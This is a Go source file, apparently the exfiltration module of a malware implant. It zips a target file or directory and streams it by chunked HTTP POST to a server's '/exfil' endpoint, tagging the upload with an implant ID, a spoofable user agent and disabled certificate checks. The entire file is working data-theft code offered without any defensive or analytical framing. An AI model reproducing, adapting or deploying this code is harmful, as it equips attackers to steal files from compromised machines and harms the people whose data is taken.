package exfil

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"

	"github.com/carved4/net/pkg/net"
)

func StreamZip(path string, w io.Writer) error {
	fi, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("stat failed: %w", err)
	}

	zw := zip.NewWriter(w)
	defer zw.Close()

	if fi.IsDir() {
		basePath := filepath.Clean(path)
		err = filepath.Walk(basePath, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}

			relPath, err := filepath.Rel(basePath, filePath)
			if err != nil {
				return err
			}

			relPath = filepath.ToSlash(relPath)
			if relPath == "." {
				return nil
			}

			header, err := zip.FileInfoHeader(info)
			if err != nil {
				return err
			}
			header.Name = relPath

			if info.IsDir() {
				header.Name += "/"
				_, err = zw.CreateHeader(header)
				return err
			}

			header.Method = zip.Deflate

			writer, err := zw.CreateHeader(header)
			if err != nil {
				return err
			}

			file, err := os.Open(filePath)
			if err != nil {
				return err
			}
			defer file.Close()

			_, err = io.Copy(writer, file)
			return err
		})
	} else {
		header, err := zip.FileInfoHeader(fi)
		if err != nil {
			return fmt.Errorf("create header failed: %w", err)
		}
		header.Method = zip.Deflate

		writer, err := zw.CreateHeader(header)
		if err != nil {
			return fmt.Errorf("create file in zip failed: %w", err)
		}

		file, err := os.Open(path)
		if err != nil {
			return fmt.Errorf("open file failed: %w", err)
		}
		defer file.Close()

		_, err = io.Copy(writer, file)
		if err != nil {
			return fmt.Errorf("copy to zip failed: %w", err)
		}
	}

	if err != nil {
		return fmt.Errorf("walk failed: %w", err)
	}

	return nil
}

func PostExfil(serverURL string, targetPath string, filename string, userAgent string, implantID string) error {
	url := serverURL
	if len(url) > 0 && url[len(url)-1] == '/' {
		url = url[:len(url)-1]
	}
	url = url + "/exfil"

	pr, pw := io.Pipe()

	go func() {
		err := StreamZip(targetPath, pw)
		pw.CloseWithError(err)
	}()

	return httpPost(url, pr, filename, userAgent, implantID)
}

func httpPost(url string, bodyReader io.Reader, filename string, userAgent string, implantID string) error {
	headers := map[string]string{
		"Content-Type": "application/zip",
		"X-Filename":   filename,
		"X-Implant-ID": implantID,
	}

	cfg := &net.Config{
		UserAgent:  userAgent,
		SkipVerify: true,
	}

	_, err := net.PostChunked(url, headers, bodyReader, cfg)
	return err
}
